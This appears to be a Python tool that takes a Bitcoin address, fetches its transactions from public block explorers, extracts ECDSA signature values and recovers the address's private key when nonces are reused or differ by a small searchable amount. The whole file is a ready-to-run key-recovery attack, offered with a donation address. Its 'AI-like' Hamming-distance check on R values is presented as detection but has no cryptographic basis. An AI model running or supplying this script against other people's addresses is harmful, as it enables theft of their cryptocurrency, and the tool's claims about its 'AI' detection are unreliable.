# -*- coding: utf-8 -*-
"""
@author: iceland
"""
import sys
import hashlib
import json
import argparse
from urllib.request import urlopen
from itertools import combinations
import secp256k1 as ice
import smart_tools

G = ice.scalar_multiplication(1)
N = ice.N
ZERO = ice.Zero

parser = argparse.ArgumentParser(description='Extract RSZ and detect private key using R reuse and AI similarity analysis.', 
                                 epilog='Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at')
parser.add_argument("-a", help = "Bitcoin Address", required=True)

bP = 100000000

if len(sys.argv)==1:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()
address = args.a

#==============================================================================
def get_rs(sig):
    rlen = int(sig[2:4], 16)
    r = sig[4:4+rlen*2]
    s = sig[8+rlen*2:]
    return r, s

def split_sig_pieces(script):
    sigLen = int(script[2:4], 16)
    sig = script[2+2:2+sigLen*2]
    r, s = get_rs(sig[4:])
    pubLen = int(script[4+sigLen*2:4+sigLen*2+2], 16)
    pub = script[4+sigLen*2+2:]
    assert(len(pub) == pubLen*2)
    return r, s, pub

def parseTx(txn):
    if len(txn) <130:
        print('[WARNING] rawtx most likely incorrect. Please check..')
        sys.exit(1)
    inp_list = []
    ver = txn[:8]
    if txn[8:12] == '0001':
        print('UnSupported Tx Input. Presence of Witness Data')
        sys.exit(1)
    inp_nu = int(txn[8:10], 16)
    first = txn[0:10]
    cur = 10
    for m in range(inp_nu):
        prv_out = txn[cur:cur+64]
        var0 = txn[cur+64:cur+64+8]
        cur = cur+64+8
        scriptLen = int(txn[cur:cur+2], 16)
        script = txn[cur:2+cur+2*scriptLen]
        r, s, pub = split_sig_pieces(script)
        seq = txn[2+cur+2*scriptLen:10+cur+2*scriptLen]
        inp_list.append([prv_out, var0, r, s, pub, seq])
        cur = 10+cur+2*scriptLen
    rest = txn[cur:]
    return [first, inp_list, rest]

def get_rawtx_from_blockchain(txid):
    try:
        htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout = 20)
    except:
        print('Unable to connect to fetch RawTx.')
        sys.exit(1)
    else:
        return htmlfile.read().decode('utf-8')

def getSignableTxn(parsed):
    res = []
    first, inp_list, rest = parsed
    tot = len(inp_list)
    for one in range(tot):
        e = first
        for i in range(tot):
            e += inp_list[i][0]
            e += inp_list[i][1]
            if one == i: 
                e += '1976a914' + smart_tools.hash160(bytes.fromhex(inp_list[one][4])).hex() + '88ac'
            else:
                e += '00'
            e += inp_list[i][5]
        e += rest + "01000000"
        z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
        res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
    return res

def diff_comb_idx(alist):
    LL = len(alist)
    return [(i, j, ice.point_subtraction(alist[i], alist[j])) for i in range(LL) for j in range(i+1, LL)]

def inv(a): return pow(a, N - 2, N)

def calc_RQ(r, s, z, pub_point):
    RP1 = ice.pub2upub('02' + hex(r)[2:].zfill(64))
    RP2 = ice.pub2upub('03' + hex(r)[2:].zfill(64))
    sdr = (s * inv(r)) % N
    zdr = (z * inv(r)) % N
    FF1 = ice.point_subtraction( ice.point_multiplication(RP1, sdr), ice.scalar_multiplication(zdr) )
    FF2 = ice.point_subtraction( ice.point_multiplication(RP2, sdr), ice.scalar_multiplication(zdr) )
    if FF1 == pub_point: print('[✓] RSZ to PubKey Match'); return RP1
    if FF2 == pub_point: print('[✓] RSZ to PubKey Match'); return RP2
    return '[x] Failed RSZ to PubKey match'

def getk1(r1, s1, z1, r2, s2, z2, m):
    nr = (s2 * m * r1 + z1 * r2 - z2 * r1) % N
    dr = (s1 * r2 - s2 * r1) % N
    return (nr * inv(dr)) % N

def getpvk(r1, s1, z1, r2, s2, z2, m):
    x1 = (s2 * z1 - s1 * z2 + m * s1 * s2) % N
    xi = inv((s1 * r2 - s2 * r1) % N)
    return (x1 * xi) % N

def check_tx(address):
    txid, cdx = [], []
    try:
        htmlfile = urlopen("https://mempool.space/api/address/%s/txs" % address, timeout = 20)
    except:
        print('Unable to connect for Tx list.')
        sys.exit(1)
    else:
        res = json.loads(htmlfile.read())
        for tx in res:
            for j, vin in enumerate(tx["vin"]):
                if vin["prevout"]["scriptpubkey_address"] == address:
                    txid.append(tx["txid"])
                    cdx.append(j)
    return txid, cdx

#==============================================================================
print('\n📌 Starting Program...')
print('-'*120)
txid, cdx = check_tx(address)
RQ, rL, sL, zL, QL = [], [], [], [], []

for c in range(len(txid)):
    rawtx = get_rawtx_from_blockchain(txid[c])
    try:
        m = parseTx(rawtx)
        e = getSignableTxn(m)
        for i in range(len(e)):
            if i == cdx[c]:
                rL.append(int(e[i][0], 16))
                sL.append(int(e[i][1], 16))
                zL.append(int(e[i][2], 16))
                QL.append(ice.pub2upub(e[i][3]))
                print('='*70)
                print(f'[Input Index: {i}] [txid: {txid[c]}]\nR: {e[i][0]}\nS: {e[i][1]}\nZ: {e[i][2]}\nPubKey: {e[i][3]}')
    except:
        print(f'Skipping Tx: {txid[c]}')

# ------------------------------------------------------------------------------
# دمج الذكاء: كشف التشابه بين قيم R عبر Hamming Distance
print('='*70)
print('🔍 Checking for R-value similarities using AI-like logic...')

def is_r_similar(r1, r2, threshold=0.9):
    if len(r1) != len(r2):
        return False
    diff = sum(c1 != c2 for c1, c2 in zip(bin(int(r1, 16))[2:].zfill(256), bin(int(r2, 16))[2:].zfill(256)))
    similarity = 1 - (diff / 256)
    return similarity >= threshold

def find_similar_r_pairs(r_list, threshold=0.9):
    similar_pairs = []
    for i in range(len(r_list)):
        for j in range(i+1, len(r_list)):
            if is_r_similar(r_list[i], r_list[j], threshold):
                similar_pairs.append((i, j, r_list[i], r_list[j]))
    return similar_pairs

r_hex_list = [hex(r)[2:].zfill(64) for r in rL]
similar_rs = find_similar_r_pairs(r_hex_list, threshold=0.94)

if similar_rs:
    print(f'[AI WARNING] {len(similar_rs)} Similar R-pairs found:')
    for i, j, r1, r2 in similar_rs:
        print(f'  [Index {i} vs {j}] R1: {r1} ≈ R2: {r2}')
else:
    print('✅ No similar R-values detected.')
print('='*70)

#------------------------------------------------------------------------------
for c in range(len(rL)):
    RQ.append(calc_RQ(rL[c], sL[c], zL[c], QL[c]))

RD = diff_comb_idx(RQ)

print('RD = ')
for i in RD: print(f'{i[2].hex()}')
for i in RD:
    if i[2] == ZERO:
        print(f'[!!] Duplicate R Found: {i[0]} vs {i[1]}')

print(f'Starting BSGS Table with {bP} elements...')
ice.bsgs_2nd_check_prepare(bP)

solvable_diff = []
for Q in RD:
    found, diff = ice.bsgs_2nd_check(Q[2], -1, bP)
    if found:
        solvable_diff.append((Q[0], Q[1], diff.hex()))

print('='*70); print('-'*120)
for i in solvable_diff:
    print(f'[i={i[0]}] [j={i[1]}] [R Diff = {i[2]}]')
    k = getk1(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
    d = getpvk(rL[i[0]], sL[i[0]], zL[i[0]], rL[i[1]], sL[i[1]], zL[i[1]], int(i[2], 16))
    print(f'Privatekey FOUND: {hex(d)}')
    for key in ice.one_to_6privatekey(d):
        addr = ice.privatekey_to_address(0, True, key)
        if addr == address:
            print(f'[✓] PrivateKey VALIDATED: {hex(key)}')
            break
    print('='*70); print('-'*120)

print('✅ Program Finished.')
